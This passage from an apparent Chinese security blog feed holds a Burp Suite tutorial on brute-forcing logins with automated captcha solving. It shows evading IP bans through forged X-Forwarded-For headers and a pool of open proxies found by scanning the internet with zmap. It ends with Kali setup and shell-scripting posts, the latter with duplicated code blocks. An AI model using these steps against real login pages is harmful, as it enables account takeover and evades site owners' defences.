src="https://imges.xenon.us.kg/20241211/Pasted-image-20241206020356.jpg" alt="Pasted-image-20241206020356"></li></ul><h2 id="验证码爆破"><a href="#验证码爆破" class="headerlink" title="验证码爆破"></a>验证码爆破</h2><h3 id="配置相关环境"><a href="#配置相关环境" class="headerlink" title="配置相关环境"></a>配置相关环境</h3><ol><li>下载<code>jar</code>扩展和验证码识别脚本<div class="btns rounded grid5">            <a class="button no-text-decoration" href='https://github.com/f0ng/captcha-killer-modified/' title='下载源码'><i class='anzhiyufont anzhiyu-icon-bolt'></i>下载源码</a>          </div></li><li>安装验证码脚本所需的python库</li></ol><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip install ddddocr aiohttp</span><br></pre></td></tr></table></figure><ol start="3"><li>导入<code>jar</code>扩展<br><img src="https://imges.xenon.us.kg/20241211/Pasted-image-20241210004323.jpg" alt="Pasted-image-20241210004323"></li></ol><h3 id="使用步骤"><a href="#使用步骤" class="headerlink" title="使用步骤"></a>使用步骤</h3><h4 id="抓取验证码请求包"><a href="#抓取验证码请求包" class="headerlink" title="抓取验证码请求包"></a>抓取验证码请求包</h4><ol><li>选中验证码右键新标签打开，可以看到验证码的照片，刷新一下验证码会有改变(仅只适用于这种类型验证码识别)<br><img src="https://imges.xenon.us.kg/20241211/Pasted-image-20241210004546.jpg" alt="Pasted-image-20241210004546"></li><li>刷新一下验证码的网页，抓取获取验证码的请求包，选择发送到扩展验证码部分<br><img src="https://imges.xenon.us.kg/20241211/Pasted-image-20241210004842.jpg" alt="Pasted-image-20241210004842"></li><li>打开扩展的页面每获取一下都能改变验证码图片，那就证明获取获取成功了<br><img src="https://imges.xenon.us.kg/20241211/Pasted-image-20241210005132.jpg" alt="Pasted-image-20241210005132"></li></ol><h4 id="配置验证码识别脚本"><a href="#配置验证码识别脚本" class="headerlink" title="配置验证码识别脚本"></a>配置验证码识别脚本</h4><ol><li>前面已经安装好了库，直接运行。看到<code>running on http:0.0.0.0:8888</code>证明运行成功了</li></ol><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 codereg.py</span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20241211/Pasted-image-20241210005337.jpg" alt="Pasted-image-20241210005337"><br>2. 将识别的地址填入接口，右键模板，根据自身爆破的验证码类型设置，我这里纯数字于是填写纯数字<br><img src="https://imges.xenon.us.kg/20241211/Pasted-image-20241210185616.jpg" alt="Pasted-image-20241210185616"><br>3. 将识别的网页接口配置到扩展后，点击获取，然后再测试识别，测试一下能否正常工作。<br><img src="https://imges.xenon.us.kg/20241211/Pasted-image-20241210185431.jpg" alt="Pasted-image-20241210185431"></p><h4 id="抓取登录请求包，设置攻击"><a href="#抓取登录请求包，设置攻击" class="headerlink" title="抓取登录请求包，设置攻击"></a>抓取登录请求包，设置攻击</h4><ol><li>随便输入个账号密码抓取，发送到攻击器<br><img src="https://imges.xenon.us.kg/20241211/Pasted-image-20241210185816.jpg" alt="Pasted-image-20241210185816"></li><li>选择集群炸弹，和添加<code>payload</code>位置，这里我就爆破密码和验证码<br><img src="https://imges.xenon.us.kg/20241211/Pasted-image-20241210190016.jpg" alt="Pasted-image-20241210190016"></li><li>按照你添加<code>payload</code>的顺序来配置爆破的字典，验证码部分选择为模块<br><img src="https://imges.xenon.us.kg/20241211/Pasted-image-20241210190136.jpg" alt="Pasted-image-20241210190136"></li><li>设置资源池<br><img src="https://imges.xenon.us.kg/20241211/Pasted-image-20241210190430.jpg" alt="Pasted-image-20241210190430"></li><li>扩展记得开启使用<br><img src="https://imges.xenon.us.kg/20241211/Pasted-image-20241210190157.jpg" alt="Pasted-image-20241210190157"></li></ol><ul><li>测试结果，<code>payload2</code>是我验证码的部分能正常运作<br><img src="https://imges.xenon.us.kg/20241211/Pasted-image-20241210190505.jpg" alt="Pasted-image-20241210190505"></li></ul><h2 id="IP伪造技术"><a href="#IP伪造技术" class="headerlink" title="IP伪造技术"></a>IP伪造技术</h2><ul><li>简述<ul><li>当对一个传参点进行测试的时候服务器可能会对IP有请求限制，超过一定限制后将会对IP地址进行封禁，这时候就需要对IP地址伪造来对传参点进行多次测试。</li></ul></li><li>实现的方法<ul><li>方法一：<ul><li>通过修改数据包中源IP地址字段来实现如网络层IP数据包中的<code>Source IP Address</code>和应用层中的HTTP请求包中的<code>X-Forwarded-For</code>、<code>Client-IP</code>来实现。但是服务器日志能正常看到请求的IP</li></ul></li><li>方法二：<ul><li>利用代理中继的方法通过使用代理服务器、CDN、僵尸网络(Tor网络)、匿名网络来转发流量将目标服务器与攻击者隔离，隐藏真实IP。服务器日志看到的是不同IP进行的正常请求</li></ul></li></ul></li></ul><h3 id="配置python解释环境"><a href="#配置python解释环境" class="headerlink" title="配置python解释环境"></a>配置python解释环境</h3><ul><li>后面的扩展都需要python环境，先安装<code>jython</code>：<a href="https://www.jython.org/">Home | Jython</a></li></ul><h6 id="配置jython"><a href="#配置jython" class="headerlink" title="配置jython"></a>配置jython</h6><ol><li>下载包<br><img src="https://imges.xenon.us.kg/20241221/Pasted-image-20241219160918.jpg" alt="Pasted-image-20241219160918"></li><li>选择最新版<code>jar</code>类型的<br><img src="https://imges.xenon.us.kg/20241221/Pasted-image-20241219160946.jpg" alt="Pasted-image-20241219160946"></li><li>打开Burp Suite导入，注意路径不能有中文。<br><img src="https://imges.xenon.us.kg/20241221/Pasted-image-20241219161437.jpg" alt="Pasted-image-20241219161437"></li></ol><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><ul><li>这种方式适用于应用层的HTTP协议请求包欺骗，无法欺骗传输层的TCP&#x2F;IP协议，而服务器的日志记录的访问IP就是基于TCP&#x2F;IP的真实发送IP。<ul><li>实现方法利用扩展<code>BurpFakeIP</code>来为请求包中添加<code>X-Forwarded-For</code>、<code>Client-IP</code>来实现，但是一个个添加肯定不太限时，于是就需要到扩展</li></ul></li></ul><h4 id="一、安装扩展"><a href="#一、安装扩展" class="headerlink" title="一、安装扩展"></a>一、安装扩展</h4><ul><li>扩展下载<a href="https://github.com/TheKingOfDuck/burpFakeIP">地址</a>，导入即可。如果无法使用或者报错要看看自己<code>jython</code>或者扩展路径是不是有中文<br><img src="https://imges.xenon.us.kg/20241221/Pasted-image-20241220015830.jpg" alt="Pasted-image-20241220015830"></li></ul><h4 id="二、基本使用"><a href="#二、基本使用" class="headerlink" title="二、基本使用"></a>二、基本使用</h4><ul><li>在请求包右键扩展选择<code>BurpFakeIP</code>选择一种模式伪造IP<br><img src="https://imges.xenon.us.kg/20241221/Pasted-image-20241220020606.jpg" alt="Pasted-image-20241220020606"></li><li>配合<code>Intruder</code>使用<br><img src="https://imges.xenon.us.kg/20241221/Pasted-image-20241220020731.jpg" alt="Pasted-image-20241220020731"></li><li>测试结果<br><img src="https://imges.xenon.us.kg/20241221/Pasted-image-20241220020833.jpg" alt="Pasted-image-20241220020833"></li></ul><h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><ul><li>通过获取大量的代理地址或者僵尸网络、肉鸡等，代替客户端发送请求包到服务器，那又要怎么获取如此数量庞大的代理服务器来，那就需要<code>zmap</code><ul><li><code>zmap</code>专为大规模扫描设计，可以在较短时间内扫描整个IPv4地址空间。找到指定服务的端口，相较于<code>nmap</code>更专注于扫描而不支持服务检测。而且<code>nmap</code>是对一个网络，<code>zmap</code>是对整个互联网</li></ul></li></ul><h4 id="一、配置安装zmap"><a href="#一、配置安装zmap" class="headerlink" title="一、配置安装zmap"></a>一、配置安装zmap</h4><blockquote><p>通过软件包安装的的<code>zmap</code>版本较低缺乏部分依赖，可通过编译安装来确保功能正常使用，这边使用的是debian系统</p></blockquote><ol><li>下载相关依赖和源代码，github链接：<a href="https://github.com/zmap/zmap.git">链接</a></li></ol><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt-get update</span><br><span class="line"></span><br><span class="line"><span class="built_in">sudo</span> apt-get install -y build-essential cmake libgmp3-dev gengetopt libpcap-dev flex byacc pkg-config libunistring-dev git libjudy-dev libjson-c-dev libunistring-dev</span><br><span class="line"></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/zmap/zmap.git</span><br></pre></td></tr></table></figure><ol start="2"><li>构建环境</li></ol><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> zmap</span><br><span class="line"><span class="comment">#进入源代码目录</span></span><br><span class="line"><span class="built_in">mkdir</span> build &amp;&amp; <span class="built_in">cd</span> build</span><br><span class="line"><span class="comment">#创建构建目录并进入</span></span><br><span class="line">cmake ..</span><br><span class="line"><span class="comment">#向上一个目录构建工具</span></span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20241221/Pasted-image-20241218212831.jpg" alt="Pasted-image-20241218212831"><br>3. 编译安装</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">make</span><br><span class="line"><span class="built_in">sudo</span> make install</span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20241221/Pasted-image-20241218213038.jpg" alt="Pasted-image-20241218213038"><br>4. 验证安装</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">zmap --version</span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20241221/Pasted-image-20241218213242.jpg" alt="Pasted-image-20241218213242"></p><h4 id="二、zmap基本命令"><a href="#二、zmap基本命令" class="headerlink" title="二、zmap基本命令"></a>二、zmap基本命令</h4><ul><li>可以指定网段，在<code>-</code>的参数后面加网段即可</li></ul><table><thead><tr><th><strong>命令</strong></th><th><strong>说明</strong></th><th><strong>示例</strong></th></tr></thead><tbody><tr><td><code>zmap -p</code></td><td>扫描指定端口可范围的目标 IP 地址</td><td><code>zmap -p 80</code></td></tr><tr><td><code>zmap -a IP_RANGE</code></td><td>扫描指定的 IP 地址范围</td><td><code>zmap -a</code></td></tr><tr><td><code>zmap --output-module</code></td><td>指定输出格式，例如 CSV、JSON</td><td><code>zmap --output-module=csv --output-fields=saddr</code></td></tr><tr><td><code>zmap --output-fields</code></td><td>指定输出字段，例如 saddr、port、status</td><td><code>zmap --output-fields=saddr,port,status</code></td></tr><tr><td><code>zmap --output-filter</code></td><td>输出过滤条件，例如只显示成功响应的 IP(默认即使响应的)</td><td><code>zmap --output-filter=&#39;success=1&#39;</code></td></tr><tr><td><code>zmap --version</code></td><td>显示 ZMap 版本号</td><td><code>zmap --version</code></td></tr><tr><td><code>zmap -T THREADS</code></td><td>设置并发连接数</td><td><code>zmap -T 1000</code></td></tr><tr><td><code>zmap -u -p PORT IP_RANGE</code></td><td>使用 UDP 扫描</td><td><code>zmap -u -p 80</code></td></tr><tr><td><code>zmap -S PROXY</code></td><td>使用代理 IP</td><td><code>zmap -S </code></td></tr><tr><td><code>zmap -r PORT_RANGE IP_RANGE</code></td><td>随机扫描指定端口范围</td><td><code>zmap -r 1-65535</code></td></tr></tbody></table><h5 id="扫描互联网上的代理端口"><a href="#扫描互联网上的代理端口" class="headerlink" title="扫描互联网上的代理端口"></a>扫描互联网上的代理端口</h5><ul><li>80,443用于 HTTP 协议的代理转发，1080为Socks5代理端口</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">zmap -p 80,443,1080 -o ip_port.txt -T 4</span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20241221/Pasted-image-20241218221326.jpg" alt="Pasted-image-20241218221326"></p><h5 id="筛选出可用的地址"><a href="#筛选出可用的地址" class="headerlink" title="筛选出可用的地址"></a>筛选出可用的地址</h5><ul><li>这里参考众多大佬的写的脚本找AI改了一个</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests  <span class="comment"># 用于HTTP请求</span></span><br><span class="line"><span class="keyword">from</span> concurrent.futures <span class="keyword">import</span> ThreadPoolExecutor  <span class="comment"># 用于并发操作</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 测试URL，用于验证代理IP是否可用</span></span><br><span class="line">TEST_URL = <span class="string">&#x27;http://www.baidu.com&#x27;</span></span><br><span class="line"><span class="comment"># 输入文件路径</span></span><br><span class="line">INPUT_FILE = <span class="string">&#x27;raw_ips.txt&#x27;</span></span><br><span class="line"><span class="comment"># 可用代理IP输出文件路径</span></span><br><span class="line">OUTPUT_FILE = <span class="string">&#x27;ip_prot.txt&#x27;</span></span><br><span class="line"><span class="comment"># 最大线程数</span></span><br><span class="line">MAX_WORKERS = <span class="number">10</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_proxy</span>(<span class="params">proxy, test_url, output_file</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    检测单个代理是否可用，并立即写入文件。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Args:</span></span><br><span class="line"><span class="string">        proxy (str): 代理地址，格式为 &#x27;ip:port&#x27;。</span></span><br><span class="line"><span class="string">        test_url (str): 用于验证代理的目标URL。</span></span><br><span class="line"><span class="string">        output_file (str): 可用代理写入的文件路径。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 设置代理</span></span><br><span class="line">    proxies = &#123;</span><br><span class="line">        <span class="string">&#x27;http&#x27;</span>: <span class="string">f&#x27;http://<span class="subst">&#123;proxy&#125;</span>&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;https&#x27;</span>: <span class="string">f&#x27;https://<span class="subst">&#123;proxy&#125;</span>&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 发送请求，设置超时时间为5秒</span></span><br><span class="line">        response = requests.get(test_url, proxies=proxies, timeout=<span class="number">5</span>)</span><br><span class="line">        <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;代理IP <span class="subst">&#123;proxy&#125;</span> 可用&#x27;</span>)</span><br><span class="line">            <span class="comment"># 立即写入文件，防止数据丢失</span></span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(output_file, <span class="string">&#x27;a&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">                file.write(<span class="string">f&#x27;<span class="subst">&#123;proxy&#125;</span>\n&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span> requests.RequestException <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;代理IP <span class="subst">&#123;proxy&#125;</span> 不可用: <span class="subst">&#123;e&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">process_proxies</span>(<span class="params">input_file, output_file, test_url, max_workers</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    处理代理列表，使用多线程并发检测代理的可用性。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Args:</span></span><br><span class="line"><span class="string">        input_file (str): 包含代理地址的输入文件路径。</span></span><br><span class="line"><span class="string">        output_file (str): 可用代理写入的文件路径。</span></span><br><span class="line"><span class="string">        test_url (str): 用于验证代理的目标URL。</span></span><br><span class="line"><span class="string">        max_workers (int): 最大并发线程数。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 读取代理IP文件并去掉逗号</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(input_file, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        proxies = [line.replace(<span class="string">&#x27;,&#x27;</span>, <span class="string">&#x27;:&#x27;</span>).strip() <span class="keyword">for</span> line <span class="keyword">in</span> file <span class="keyword">if</span> line.strip()]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 使用多线程检测代理</span></span><br><span class="line">    <span class="keyword">with</span> ThreadPoolExecutor(max_workers=max_workers) <span class="keyword">as</span> executor:</span><br><span class="line">        <span class="keyword">for</span> proxy <span class="keyword">in</span> proxies:</span><br><span class="line">            executor.submit(check_proxy, proxy, test_url, output_file)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># 调用主函数处理代理列表</span></span><br><span class="line">    process_proxies(INPUT_FILE, OUTPUT_FILE, TEST_URL, MAX_WORKERS)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;检测完成，可用代理已写入文件: <span class="subst">&#123;OUTPUT_FILE&#125;</span>&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20241221/Pasted-image-20241219162607.jpg" alt="Pasted-image-20241219162607"></p><h4 id="三、配置Burp-Suite代理插件"><a href="#三、配置Burp-Suite代理插件" class="headerlink" title="三、配置Burp Suite代理插件"></a>三、配置Burp Suite代理插件</h4><blockquote><p>设置代理池需要用到Burp Suite的一个扩展，扩展地址：<a href="https://github.com/Maikefee/BurpAutoProxySwitcherPlugins_Maikefee">地址</a></p></blockquote><ul><li>注意路径不能有中文，如果报错就要检查一下是不是<code>jython</code>问题。<br><img src="https://imges.xenon.us.kg/20241221/Pasted-image-20241219161837.jpg" alt="Pasted-image-20241219161837"></li></ul><h4 id="四、测试使用"><a href="#四、测试使用" class="headerlink" title="四、测试使用"></a>四、测试使用</h4><ol><li>这边原先是筛选的端口为<code>80</code>、<code>443</code>、<code>1080</code>，这边后续过滤出来的包含<code>1080</code>端口<code>SOCKS5协议</code>的，最好就是将他从筛选出来。<br><img src="https://imges.xenon.us.kg/20241221/Pasted-image-20241219162900.jpg" alt="Pasted-image-20241219162900"></li><li>攻击器找个传参点跑一下试试<br><img src="https://imges.xenon.us.kg/20241221/Pasted-image-20241219163037.jpg" alt="Pasted-image-20241219163037"></li><li>查看结果，因为有可能节点访问不到这个地址，等其他因素，要保证成功发包最好就多次筛选<br><img src="https://imges.xenon.us.kg/20241221/Pasted-image-20241219163127.jpg" alt="Pasted-image-20241219163127"></li><li>查看模块，也可以看到有正常运行，设置代理<br><img src="https://imges.xenon.us.kg/20241221/Pasted-image-20241219163328.jpg" alt="Pasted-image-20241219163328"></li></ol>]]></content>
      
      
      <categories>
          
          <category> 安全相关 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Burp Suite </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kali Liunx 基本配置</title>
      <link href="/posts/14692180.html"/>
      <url>/posts/14692180.html</url>
      
        <content type="html"><![CDATA[<h3 id="设置显示大小"><a href="#设置显示大小" class="headerlink" title="设置显示大小"></a>设置显示大小</h3><ul><li>在设置里面找到<code>HiDPI</code>，打开点击<code>yes</code>即可正常显示<br><img src="https://imges.xenon.us.kg/20241208/Pasted-image-20241208161611.jpg" alt="Pasted-image-20241208161611"></li></ul><h3 id="设置apt国内软件源"><a href="#设置apt国内软件源" class="headerlink" title="设置apt国内软件源"></a>设置apt国内软件源</h3><ul><li>推荐使用：<a href="https://developer.aliyun.com/mirror/">阿里源</a>、<a href="https://mirrors.ustc.edu.cn/">中科大</a></li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> vim /etc/apt/sources.list</span><br><span class="line"><span class="comment">#非root用户使用sudo输入的密码为开机的密码</span></span><br></pre></td></tr></table></figure><ul><li>打开后按<code>gg</code>回到第一行，再按<code>dG</code>删除所有内容，将准备好的镜像源<code>shift</code>+<code>ctrl</code>+<code>V</code>粘贴进去，最后按一下<code>Esc</code>再输入<code>:wq</code>保存<br><img src="https://imges.xenon.us.kg/20241208/Pasted-image-20241208153002.jpg" alt="Pasted-image-20241208153002"></li><li>更新源缓存(不建议<code>upgrade</code>更新所有软件包)</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt update</span><br><span class="line"><span class="comment">#非root用户使用sudo输入的密码为开机的密码</span></span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20241208/Pasted-image-20241208153157.jpg" alt="Pasted-image-20241208153157"></p><h3 id="切换为中文"><a href="#切换为中文" class="headerlink" title="切换为中文"></a>切换为中文</h3><ul><li>下载中文字体</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt-get install ttf-wqy-microhei ttf-wqy-zenhei xfonts-wqy</span><br><span class="line"><span class="comment">#非root用户使用sudo输入的密码为开机的密码</span></span><br></pre></td></tr></table></figure><ul><li>切换为中文，往下滑找到<code>zh_CN.UTF-8</code>，按空格选中后按<code>tab</code>确定，选择<code>zh_CN.UTF-8</code>为系统语言，确认。我这边已经是中文了。</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> dpkg-reconfigure locales</span><br><span class="line"><span class="comment">#非root用户使用sudo输入的密码为开机的密码</span></span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20241208/Pasted-image-20241208153629.jpg" alt="Pasted-image-20241208153629"><br><strong>注意</strong>：设备完成后重启生效。到时候会提示是否将文件名也改为中文，建议选择<strong>保留源名称</strong><br><img src="https://imges.xenon.us.kg/20241208/Pasted-image-20241208154533.jpg" alt="Pasted-image-20241208154533"></p><h3 id="安装中文输入法"><a href="#安装中文输入法" class="headerlink" title="安装中文输入法"></a>安装中文输入法</h3><ul><li>安装输入法框架</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install fcitx</span><br><span class="line"><span class="comment">#我这里提示samba包未满足的依赖关系，再执行下面命令即可，没有提示则不需要执行</span></span><br><span class="line"><span class="built_in">sudo</span> apt install samba</span><br></pre></td></tr></table></figure><ul><li>安装谷歌输入法</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install fcitx-googlepinyin  </span><br></pre></td></tr></table></figure><ul><li>按<code>ctrl</code>+空格切换输入法<br><img src="https://imges.xenon.us.kg/20241208/Pasted-image-20241208155046.jpg" alt="Pasted-image-20241208155046"></li></ul><h3 id="安装应用商城"><a href="#安装应用商城" class="headerlink" title="安装应用商城"></a>安装应用商城</h3><ul><li>进入星火<a href="https://www.spark-app.store/download_latest">软件商城官网</a>下载软件本体<br><img src="https://imges.xenon.us.kg/20241208/Pasted-image-20241208155509.jpg" alt="Pasted-image-20241208155509"></li><li>然后打开下载目录，右键打开终端<br><img src="https://imges.xenon.us.kg/20241208/Pasted-image-20241208155804.jpg" alt="Pasted-image-20241208155804"></li><li>执行安装中会提示依赖问题。</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> dpkg -i spark-store_4.3.3.1-fix3_amd64.deb</span><br><span class="line"><span class="comment">#执行下方来解决依赖问题</span></span><br><span class="line"><span class="built_in">sudo</span> apt-get -f install</span><br><span class="line"><span class="comment">#重新安装即可完成</span></span><br><span class="line"><span class="built_in">sudo</span> dpkg -i spark-store_4.3.3.1-fix3_amd64.deb</span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20241208/Pasted-image-20241230190345.jpg" alt="Pasted-image-20241230190345"></p><ul><li>解决依赖问题<br><img src="https://imges.xenon.us.kg/20241208/Pasted-image-20241230190408.jpg" alt="Pasted-image-20241230190408"></li><li>重新执行安装即可<br><img src="https://imges.xenon.us.kg/20241208/Pasted-image-20241230190447.jpg" alt="Pasted-image-20241230190447"></li><li>安装成功，后续大部分国内程序都可以从这里下载<br><img src="https://imges.xenon.us.kg/20241208/Pasted-image-20241208161322.jpg" alt="Pasted-image-20241208161322"></li></ul>]]></content>
      
      
      <categories>
          
          <category> 安全相关 </category>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kali </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Shell脚本基础</title>
      <link href="/posts/a6d155fc.html"/>
      <url>/posts/a6d155fc.html</url>
      
        <content type="html"><![CDATA[<h2 id="脚本解释器与变量"><a href="#脚本解释器与变量" class="headerlink" title="脚本解释器与变量"></a>脚本解释器与变量</h2><h3 id="脚本文件类似"><a href="#脚本文件类似" class="headerlink" title="脚本文件类似"></a>脚本文件类似</h3><blockquote><p>知道windows下有<code>.bat</code>脚本用来批量执行命令的，那Liunx下呢则是使用<code>.sh</code>脚本来批量执行命令，称为<code>shell脚本</code></p></blockquote><ol><li>创建脚本的方式很多，只需要保证文件类型为<code>.sh</code>即可</li></ol><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">touch</span> 1.sh</span><br><span class="line">```bash</span><br><span class="line"><span class="built_in">touch</span> 1.sh</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20241205/Pasted-image-20241127005618.jpg" alt="Pasted-image-20241127005618"></p><h3 id="变量的概念"><a href="#变量的概念" class="headerlink" title="变量的概念"></a>变量的概念</h3><blockquote><p>什么是变量？可以理解为一个盒子(a)里面存放的东西为盒子(变量)的值，在Liunx中的变量通常用美元($)搞提醒操作系统他是个变量</p></blockquote><ul><li>如果设置全局变量只需要在设置变量的基础上前面加<code>export</code></li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#尝试设置一个临时变量</span></span><br><span class="line">box=v50</span><br><span class="line"><span class="comment">#然后用命令输出他，记得加上美元符号告诉系统他是一个变量</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$box</span></span><br><span class="line">```bash</span><br><span class="line"><span class="comment">#尝试设置一个临时变量</span></span><br><span class="line">box=v50</span><br><span class="line"><span class="comment">#然后用命令输出他，记得加上美元符号告诉系统他是一个变量</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$box</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20241205/Pasted-image-20241127010759.jpg" alt="Pasted-image-20241127010759"></p><h3 id="引号的概念"><a href="#引号的概念" class="headerlink" title="引号的概念"></a>引号的概念</h3><h4 id="单引号"><a href="#单引号" class="headerlink" title="单引号"></a>单引号</h4><ul><li>使用单引号包裹着变量则不会对变量进行解释(告诉他里面是什么)和赋值(将里面的东西输出)</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#尝试设置一个变量</span></span><br><span class="line">box=v50</span><br><span class="line"><span class="comment">#将变量用单引号括起来</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;$box&#x27;</span></span><br><span class="line">```bash</span><br><span class="line"><span class="comment">#尝试设置一个变量</span></span><br><span class="line">box=v50</span><br><span class="line"><span class="comment">#将变量用单引号括起来</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;$box&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20241205/Pasted-image-20241127013039.jpg" alt="Pasted-image-20241127013039"></p><h4 id="双引号"><a href="#双引号" class="headerlink" title="双引号"></a>双引号</h4><ul><li>双引号会对其中包含的变量进行解释或替换。默认不带符合则为双引号</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#尝试设置一个变量</span></span><br><span class="line">box=v50</span><br><span class="line"><span class="comment">#将变量用双引号括起来</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$box</span>&quot;</span></span><br><span class="line">```bash</span><br><span class="line"><span class="comment">#尝试设置一个变量</span></span><br><span class="line">box=v50</span><br><span class="line"><span class="comment">#将变量用双引号括起来</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$box</span>&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20241205/Pasted-image-20241127013238.jpg" alt="Pasted-image-20241127013238"></p><h4 id="花括号"><a href="#花括号" class="headerlink" title="花括号"></a>花括号</h4><ul><li>花括号在变量主要中用于明确边界、条件检索、字符串替换和截取</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#尝试设置一个变量</span></span><br><span class="line">box=v50</span><br><span class="line"><span class="comment">#正常我们如果要和变量输出的内容进行贴合(字符wo)话需要空格，而可以使用花括号来明确边界</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;box&#125;</span>wo</span><br><span class="line">```bash</span><br><span class="line"><span class="comment">#尝试设置一个变量</span></span><br><span class="line">box=v50</span><br><span class="line"><span class="comment">#正常我们如果要和变量输出的内容进行贴合(字符wo)话需要空格，而可以使用花括号来明确边界</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;box&#125;</span>wo</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20241205/Pasted-image-20241127015218.jpg" alt="Pasted-image-20241127015218"></p><ul><li>条件检索(<code>-</code>为空使用默认值、<code>+</code>为空使用赋为默认值、<code>+</code>返回指定变量的值)</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#尝试设置一个变量</span></span><br><span class="line">box=</span><br><span class="line"><span class="comment">#输出一个值为空或者未定义的变量时，默认是无输出的，但是可以使用花括号来进行设置默认值</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;box:-v50&#125;</span></span><br><span class="line">```bash</span><br><span class="line"><span class="comment">#尝试设置一个变量</span></span><br><span class="line">box=</span><br><span class="line"><span class="comment">#输出一个值为空或者未定义的变量时，默认是无输出的，但是可以使用花括号来进行设置默认值</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;box:-v50&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img 